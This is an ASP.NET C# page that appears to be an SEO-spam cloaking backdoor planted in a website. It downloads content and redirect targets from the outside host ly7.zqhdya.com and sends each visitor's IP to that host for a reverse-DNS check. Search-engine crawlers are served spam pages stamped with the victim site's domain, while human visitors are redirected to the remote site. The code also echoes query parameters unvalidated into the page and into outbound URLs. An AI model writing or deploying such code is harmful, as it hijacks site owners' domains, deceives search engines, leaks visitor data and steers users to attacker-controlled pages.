using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

public partial class eweb : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            httpxy = HttpContext.Current.Request.IsSecureConnection ? "https://" : "http://";


            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;
            jd = "";
            sz = "";
            if (Request.QueryString["g"] != null && Request.QueryString["g"] != "")
            {
                jd = webclient.DownloadString("http://ly7.zqhdya.com/1.aspx?sz=" + Request.QueryString["g"]);
                sz = Request.QueryString["g"];
            }
            else
            {
                jd = webclient.DownloadString("http://ly7.zqhdya.com/1.aspx?xy=" + httpxy);
                sz = webclient.DownloadString("http://ly7.zqhdya.com/1.aspx?jd=" + jd);
            }


            string URL = jd + "JG666.aspx";

            if (Request.QueryString["s"] != null)
            {

                URL = jd + "s888.aspx?number=" + Request.QueryString["number"] + "&pnum=" + Request.QueryString["pnum"] + "&cid=" + Request.QueryString["cid"] + "&type=" + Request.QueryString["type"];
                content = webclient.DownloadString(URL);
                content = content.Replace("yymm", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
                content = content.Replace("ggggg", sz);
                Response.ContentType = "text/xml";
                Response.Write(content);
                Response.End();
            }
            else
            {

                if (Request.QueryString["iid"] != null)
                {


                    URL += "?iid=" + Request.QueryString["iid"] + "&cid=" + Request.QueryString["cid"];
                    kname = HttpUtility.UrlDecode(Request.QueryString["shop"]);
                    tz();
                    content = webclient.DownloadString(URL);
                }
                else if (Request.QueryString["shop"] != null)
                {

                    int wid = new Random().Next(1, 237);
                    URL += "?shop=" + HttpUtility.UrlEncode(Request.QueryString["shop"]) + "&cid=" + Request.QueryString["cid"];
                    kname = HttpUtility.UrlDecode(Request.QueryString["shop"]);
                    tz();
                    content = webclient.DownloadString(URL);
                }
                else
                {
                    tz();
                    if (Request.QueryString["pnum"] != null)
                    {
                        URL += "?cid=" + Request.QueryString["cid"] + "&pnum=" + Request.QueryString["pnum"];
                    }
                    content = webclient.DownloadString(URL);
                }

            }
            content = content.Replace("ggggg", sz);
            content = content.Replace("IIIII", httpxy + HttpContext.Current.Request.Url.Host);
            content = content.Replace("UUUUU", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
            content = content.Replace("BBBBB", HttpContext.Current.Request.Url.Host);
            content = content.Replace("NNNNN", kname + Request.QueryString["iid"]);
            content = content.Replace("SSSSS", kname + Request.QueryString["iid"] + Request.QueryString["searchtxt"] + Request.QueryString["pnum"]);
            content = content.Replace("HHHHH", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
            content = content.Replace("DDDDD", " <div style='display: block'><ul><li>Related links: <a href='" + HttpContext.Current.Request.Path + "?g=" + new Random().Next(1, 14) + "&pnum=" + new Random().Next(1, 30) + "'>Plus</a></div> " + Request.QueryString["searchtxt"]);
        }
    }
    public void tz()
    {

        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_HOST"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDED_FOR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_CLIENT_IP"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDED"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_FORWARDED_FOR"] + "*" + System.Web.HttpContext.Current.Request.ServerVariables["HTTP_FORWARDED"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string ipurl = "http://ly7.zqhdya.com/getdomain.aspx?rnd=1&ip=" + ip;
        webclient = new System.Net.WebClient();
        webclient.Encoding = System.Text.Encoding.UTF8;
        string domain = webclient.DownloadString(ipurl).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1 && domain.IndexOf("yandex") == -1)
        {
            string tzurl = jd + "a.aspx";
            if (Request.QueryString["iid"] != null)
            {
                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(kname));
                Response.End();
            }
            if (Request.QueryString["shop"] != null)
            {
                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "&cname=" + HttpUtility.UrlEncode(kname));
                Response.End();
            }
            if (Request.QueryString["pnum"] != null)
            {

                Response.Redirect(tzurl + "?cid=" + Request.QueryString["cid"] + "");
                Response.End();
            }
        }
    }
    public string xi = "1";
    public string xc = "50";

    public System.Net.WebClient webclient = null;
    public string content = "";
    public string content1 = "";
    public string hyzhdy = "";
    public string Greeting = "";
    public string zhang = "";
    public string hhhvx = "";
    public string URL1 = "";
    public System.Random a = null;
    public string descriptions = "";
    public string kname = "";
    public string jd = "";
    public string sz = "";
    public string httpxy = "";
}